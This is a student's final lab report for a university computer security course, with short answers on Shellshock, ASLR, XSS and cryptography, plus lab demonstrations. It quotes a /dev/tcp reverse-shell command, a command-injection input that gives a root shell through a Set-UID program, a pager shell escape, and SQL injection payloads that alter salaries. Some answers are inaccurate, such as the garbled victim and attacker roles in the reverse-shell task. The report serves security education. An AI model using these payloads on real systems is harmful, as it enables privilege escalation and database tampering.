# Lab 09: Final Lab
- **Logan Dolechek (n47f693)**
- **logand.msu@gmail.com**
- **CSCI 476**
- **04/22/2021**
- **Link to assignment:**[https://www.traviswpeters.com/cs476-2021-spring/labs/final]
---

## Task 1: Short Answer

### Task 1.1:

_Both system() and execve() can be used to execute external programs. Why is system() considered to be unsafe while execve() is considered to be safe?_

- The problem that I can recall from system() compared to execve() is that system() will interpret some of the data as code when called. The reason why execve() is considered safer is because the code and data are separated and won't cause problems that system() can.

### Task 1.2:

_For the shellshock vulnerability to be exploitable, two conditions need to be satisfied. What are these two conditions?_

- In reference to ‘The Shellshock Attack (Part I)’ Slides, in particular slide number 16. The two conditions are: (1) The target process must run (a vuln. Version of) (2) the target process gets untrusted user inputs via environment variables.

### Task 1.3:

_Suppose we run $ nc -l 7070 on Machine 1 (IP address is 10.0.2.6), and then we type the following command on Machine 2 (IP address is 10.0.2.7) $ /bin/cat < /dev/tcp/10.0.2.6/7070 >&0 Describe what is going to happen._

- The first bash command opens a TCP listener at port 7070. The second bash command will run cat on the victim's machine (machine 1) via a TCP request and redirect the output to the attackers terminal (machine 1). This will create a reverse shell of the victim (Machine 1) so that the Attacker (Machine 2) can run commands on the victims compromised machine. 

### Task 1.4: 

_What is ASLR and why does ASLR make buffer-overflow attacks more difficult?_

- ASLR is Address Space Layout Randomization. The primary purpose of this is to protect against buffer-overflow attacks. Essentially ASLR makes it much more difficult for an attacker to find where to send a bunch of crap data and deliver a payload of malicious intent. 

### Task 1.5:

_What is the underlying cause for XSS vulnerabilities?_

- Essentially if there is a vulnerable website you can inject malicious javascript to then output back to other visitors of the website, further spreading the malicious payload.

### Task 1.6:

_What is the difference between reflected XSS and stored XSS?_

- As found on slides ‘Cross-Site Scripting (XSS) Attacks & Countermeasures (part I)’ slide #7. Reflected XSS the malicious script comes from the current HTTP request whereas the Stored XSS the malicious script comes from the website’s database.

### Task 1.7:

_In the Diffie-Hellman key exchange, Alice sends g^x mod p to Bob, and Bob sends g^y mod p to Alice. How do they get a common secret?_

- Alice sends g^x mod p to Bob and Bob sends g^y mod p to Alice. Alice then does (g^y mod p)^x mod p then Bob does (g^x mod p)^y mod p. From here both equations are the same, creating a common key. 

### Task 1.8:

_Why do we use hybrid encryption? Why don’t we simply use public key cryptography to encrypt everything?_

- When encrypting it is better to use the strengths of both asymmetric and symmetric encryption. Hence why we use a hybrid of both. We don’t just simply use a public key cryptography because first of all it wouldn’t be as nearly as secure and the speeds of encryption would be much slower. 

### Task 1.9:

_Part 1: When you run programs at the command line (e.g., ls, cat, top) or link to libraries (e.g., libc), how are these programs/libraries found?_

- The linux environment variable PATH is used to search for programs/libraries in order.

_Part 2: What is a potential risk of using this approach to find programs/libraries?_

- An attacker could modify the PATH variable, for example, to run a malicious version of ls. This would involve placing the malicious ls programs location folder higher in the PATH variable so that it is found first. 

### Task 1.10:

_Identify at least three countermeasures to buffer-overflow attacks and briefly describe how they work._

1. The first and obvious countermeasure is to write secure code to prevent buffer-overflow. If you can write your code in such a way to not allow for these overflows to happen then you are avoiding the issue at the first line of defense.
2. This one is noted to not be as easy to implement. Essentially you need to invalidate the stack to execute any instruction. Code that may attempt to execute anything other than what is in the stack will seg fault. 
3. Simply use compiler tools that have been implemented over time. They will throw warnings at you when something can potentially cause a buffer-overflow vulnerability. This is not always a given fix because depending on your compiler you may need to recompile on whatever compiler may have these tools built in.

**Link to reference:**[https://www.linuxjournal.com/article/6701]

---

## Task 2: Guest Visit Questions

### Task 2.1: Security in the Real World: Crypto

_From the real world scenario presented to us, summarize the approach my group settled on, the pros/cons, and any potential challenges or issues with our approach._

- My group decided to use GCM as our way of encrypting the users data. We would only encrypt the <data> itself, leaving the name of the project, ID, and last modified not encrypted. Since none of that was deemed important or sensitive material. The reason why we chose GCM was because if for some reason anything went wrong with the data packet, we wouldn’t lose everything. Just the one data packet that was corrupted. Also giving us feedback on which one went wrong. The other methods of encryption, like CTR, would potentially drop everything and cause a bigger problem for the user/client. GCM also offered more integrity checking than the others. As far as any cons for our choice is that GCM could lead to some possible attacks, though we deemed that for this example and client that those attacks wouldn’t be an issue. Besides the attacks, the only other issue is that if the client ever got to a bigger size of file our GCM may not cover that. Leading to a full rework of cryptography for the client. The unforeseen issue that I can’t really wrap my head around because I have never had to deal with this on a personal level is key iterations. What I mean is as versions are updated and keys need to be swapped out overtime there may be some version control issues. This would be something we would have to approach in a real world example and I’m not entirely sure at this current point in my education how a company or an operation team would handle this on a full scale.

### Task 2.2: Security in the Real World: Compliance

_Please answer the following questions._

1. In your own words, what is compliance and why is compliance important?
- Compliance is essentially rules that have been put into place to keep software and the like secure against all sorts of attacks and other security protocols. Making sure that whatever is released is safe as possible and not allowing malicious intent. Compliance is important because it keeps all sorts of companies on the same set of guidelines. Ensuring there is a professional and ethical standard. Long answer short compliance is a list of checks and balances.

2. What is a compliance framework?
- STIG (security technical implementation guide) is a compliance framework developed by defense information system agency used for configuration of computer and network systems.

3. Please provide three examples of compliance rule/test, and briefly explain why this check could be helpful towards ensuring compliance?
- STIG - 217976: The audit system must be configured to audit all use of the setuid and setgid programs.
- Since setuid can be exploited, logging all uses of these types of programs can help monitor for unusual or identify malicious events quicker.
- STIG - 16811: The designer will ensure the application does not have cross site scripting vulnerabilities.
- As we learned in this class you can do a lot of malicious attacks if XSS is a possibility.
- STIG - 16807: The Designer will ensure the application is not vulnerable to SQL injection, uses prepared or parameterized statements, does not use concatenation or replacement to build SQL queries, and does not directly access the tables in a database.
- Again from class we learned how dangerous a SQL injection can be. To be able to put measurements in place to prevent this will make everyone safer in the long run.

---

## Task 3: I got 99 Problems but Auditing Ain't One

**Summary**
_The objective of these tasks is to demonstrate my understanding of the Set-UID mechanism as well as how it can be exploited._

### Task 3.1:

_Please read the source code for audit.c and, at a high level, describe what this program does and how it works._

- This program takes a filename as input and attempts to run cat to display the files contents. This uses the system() function which makes this audit.c file vulnerable to exploitation. 

### Task 3.2:

_With our understanding of audit.c from the previous task, please demonstrate how it can be exploited to run an arbitrary command with elevated privileges. For the demonstration, I need to compile audit.c and make the resulting executable a privileged Set-UID program._

- I compiled the audit.c program and made it a root owned Set-UID program. Then I switched to user1 and created a text file that is writable to them only. By linking /bin/sh to /bin/zsh then running the executable with input “user1file.txt;/bin/sh” I got a root shell and was able to completely modify user1’s file. Exiting and switching to user1 showed the attack was successful.

<img src=https://github.com/Dolechek/csci-476-594-spring2021-private/blob/main/final/task3-2.png>

### Task 3.3:

_Suppose now that we want to fix the issue from the previous part. Now use audit2.c. This now uses execve() instead of system(). My task is to explain, and demonstrate, how the auditor can exploit audit2.c to do something they should not be able to do. For demonstration, I will need to compile audit2.c and make the resulting executable a privileged Set-UID program._

- First I compiled audit2.c and sent it to a.out. I then checked permissions of a.out to verify that the user was root. I then checked the user1file.txt to verify that it was user1’s. I then viewed the file of user1file.txt. Running the executable on user1file.txt opens the file in more. I then used the !command feature to create a subshell as root. From here I was able to change the contents of user1file.txt to “THIS FILE SUCKS HAHAHAHAHA”. I then verified that the contents had been changed.

<img src=https://github.com/Dolechek/csci-476-594-spring2021-private/blob/main/final/task3-3-1.png>
<img src=https://github.com/Dolechek/csci-476-594-spring2021-private/blob/main/final/task3-3-2.png>


---

## Task 4: Inject This...

**Summary**
_Demonstrate my understanding of SQL Injection attacks._

### Task 4.1:

_To defeat SQL injection attacks, a web application has implemented a filtering scheme on the client side: basically, on the page where users type their data, a filter is implemented using JavaScript. It removes any special character found in the data, such as apostrophes, characters for comments, and keywords reserved for SQL statements. Assume that filtering logic does it’s job, and can escape/remove all the code from the data._

_Is this solution able to defeat SQL injection attacks? Explain._

- No, because special characters can be translated into their encoded versions using % symbols bypassing the filter.


### Task 4.2:

_The following SQL statement is sent to the database to add a new user to the database, where the content of the $name and $passwd variables are provided by the user, but the EID and Salary field are set by the system. How can a malicious employee set his/her salary to a value higher than 80000? Please demonstrate and explain your approach._

-The user can create a password ending with a ‘,$SALARYVALUE to create a new password and set their own salary. For example by setting Bob’s password temp', 999999);# his password will be temp and his salary will be 999999

<img src=https://github.com/Dolechek/csci-476-594-spring2021-private/blob/main/final/tak4-2.png>

### Task 4.3:

_The following SQL statement is sent to the database, where $eid and $passwd contain data provided by the user. An attacker wants to try to get the database to run an arbitrary SQL statement. What should the attacker put inside $eid or $passwd to achieve that goal? Please demonstrate and explain your approach._

- The user can manipulate the password field to terminate this SQL statement and append another SQL statement. For example, Bob could use the password ';UPDATE employee SET Salary=1 WHERE Name='Alice';# to run an UPDATE command that sets Alice’s salary to 1. 

<img src=https://github.com/Dolechek/csci-476-594-spring2021-private/blob/main/final/task4-3.png>
---
